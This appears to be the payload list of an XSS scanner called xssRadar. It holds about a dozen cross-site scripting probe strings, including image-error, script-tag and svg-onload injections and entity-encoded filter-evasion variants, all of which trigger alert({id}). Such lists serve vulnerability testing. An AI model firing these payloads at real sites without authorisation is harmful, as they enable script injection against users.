xssRadar.scanner.payloads.general = [
'<img src=x onerror=alert({id})>',
'<script>alert({id})</script>',
'"><img src=x onerror=alert({id})>',
'" onload=alert({id})',
"\"><img src=x onerror=alert({id})>",
"</script><svg/onload=alert({id})>",
"<body onload=alert({id})>",
"<svg onload=alert`{id}`>",
"<svg onload=alert&lpar;{id}&rpar;>",
"<svg onload=alert&#x28;{id}&#x29>",
"<svg onload=alert&#40;{id}&#41>"
]